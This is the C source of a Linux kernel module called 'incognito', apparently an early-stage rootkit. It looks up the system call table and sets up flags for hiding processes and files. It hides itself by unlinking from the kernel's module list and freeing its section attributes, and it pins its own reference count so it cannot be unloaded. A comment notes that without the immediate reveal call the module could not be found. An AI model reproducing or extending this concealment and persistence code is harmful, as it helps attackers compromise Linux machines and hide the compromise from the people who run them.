#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h> // task_struct definition
#include <asm/unistd.h>
#include <linux/list.h>
#include <linux/init_task.h>
#include <linux/kobject.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/version.h>

#include <asm/uaccess.h> //we are dealing with most recent kernal
#include <asm/unistd.h>

#include "config.h"

MODULE_LICENSE("GPL");

int incognito_init(void);
void incognito_exit(void);


#ifndef __KERNEL__
#define __KERNEL__
#endif

//for hiding pids and files/directories
int hide_file = 0, control_flag = 0;
#define PF_INVISIBLE 0x10000000

// -----------------------SYSTEM CALL TABLE SECTION
unsigned long** sys_call_table;

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

/*
psize *sys_call_table;
psize **find(void) {
 psize **sctable;
 psize i = START_CHECK;
 while (i < END_CHECK) {
  sctable = (psize **) i;
  if (sctable[__NR_close] == (psize *) sys_close) {
   return &sctable[0];
  }
  i += sizeof(void *);
 }
 return NULL;
}
*/

// -----------------------END SYSTEM CALL TABLE SECTION


// --------------------------------MODULE HIDE/UNHIDE ------------------------
//We can keep a list of other hidden modules if needed
struct list_head *mod_list;

//flag for hiding incognito
int hidden = 0;

void hide(void)
{
	if (hidden)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);

	//update flag
	hidden = 1;
}

void reveal(void)
{
	if (!hidden)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	list_add(&THIS_MODULE->list, mod_list);
	mutex_unlock(&module_mutex);

	//update flag
	hidden = 0;
}

//--------------------------END MODULE HIDE/REVEAL----------------------------

//-------------------------MODULE PROTECT/UNPROTECT-------------------------
//https://www.kernel.org/doc/htmldocs/kernel-hacking/routines-module-use-counters.html
//We take advantage of the above to make incognito stick
//protection flag
int protected = 0;
void protect(void){
	if (protected){
		return;
	} else {
		try_module_get(THIS_MODULE);

		//update our protected flag
		protected = 1;
	}
}

void unprotect(void){
	if (!protected){
		return;
	} else {
		module_put(THIS_MODULE);

		//update our protected flag
		protected = 0;
	}
}

//----------------------------END PROTECT/UNPROTECT----------------------------

int __init incognito_init(void) {
  //find system call table address
	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
	if (!sys_call_table){
		printk(KERN_ERR "Incognito error: Can't find the system call table!!\n");
		return -ENOENT;
	} else {
		printk("System call table located!\n");
	}

	hide();
  printk("incognito: module loaded\n");

	//we immediately reveal since we have no way to enter commands yet!
	//if you remove this atm you won't be able to find incognito >:) 
	reveal();

  return 0;
}

void __exit incognito_exit(void) {
  printk("incognito: module removed\n");
}

module_init(incognito_init);
module_exit(incognito_exit);
